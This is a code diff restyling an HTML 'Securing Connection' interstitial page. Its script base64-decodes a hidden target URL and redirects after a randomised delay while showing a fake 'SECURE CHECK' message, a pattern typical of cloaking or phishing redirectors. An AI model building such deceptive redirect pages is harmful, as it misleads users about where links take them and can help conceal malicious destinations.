@@ -3,70 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Securing Session</title>
+    <title>Securing Connection...</title>
     <style>
+        html, body {
+            height: 100% !important;
+            width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            overflow: hidden;
+        }
+
         body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
+            background-color: #0f0c29; 
+            background: linear-gradient(to right, #24243e, #302b63, #0f0c29) !important;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            overflow: hidden;
+            color: #ffffff;
         }
+
         .card {
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.3);
             backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
             text-align: center;
-            max-width: 400px;
-            width: 90%;
+            max-width: 90%;
+            width: 350px;
         }
+
         .loader {
             width: 50px;
             height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.3);
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #00d2ff;
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
+            animation: spin 1s linear infinite;
             margin: 0 auto 20px auto;
         }
+
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        h2 { margin: 0 0 10px 0; font-weight: 600; letter-spacing: 0.5px; }
-        p { margin: 0; font-size: 14px; opacity: 0.8; }
+
+        h2 {
+            margin: 0 0 10px 0;
+            font-weight: 500;
+            font-size: 22px;
+            letter-spacing: 1px;
+        }
+
+        p {
+            margin: 0;
+            font-size: 14px;
+            color: #b8b8b8;
+        }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="loader"></div>
-        <h2>Verifying Connection</h2>
-        <p>Please wait while we establish a secure route...</p>
+        <h2>SECURE CHECK</h2>
+        <p>Verifying destination...</p>
     </div>
 
     <script nonce="{{ nonce }}">
         (function() {
             var _payload = "{{ encoded_target }}";
             
-            function _jump() {
+            function _execute() {
                 try {
                     var _url = atob(_payload);
                     window.location.replace(_url);
                 } catch (e) {
-                    console.error("Error");
+                    console.error("Redirect Error");
                 }
             }
 
-            var _delay = Math.floor(Math.random() * 800) + 1200;
-            setTimeout(_jump, _delay);
+            var _delay = Math.floor(Math.random() * 1000) + 1500;
+            setTimeout(_execute, _delay);
         })();
     </script>
 </body>
